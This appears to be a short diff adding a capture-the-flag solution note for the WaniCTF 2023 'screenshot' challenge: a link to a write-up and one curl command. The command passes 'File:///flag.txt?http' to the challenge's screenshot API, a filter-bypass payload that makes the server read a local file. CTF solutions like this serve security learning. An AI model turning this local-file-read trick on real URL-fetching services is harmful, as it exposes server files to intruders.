@@ -1,0 +1,3 @@
+https://github.com/satoki/ctf_writeups/tree/master/WaniCTF_2023/screenshot
+
+$ curl 'https://screenshot-web.wanictf.org/api/screenshot?url=File:///flag.txt?http' -o flag.png
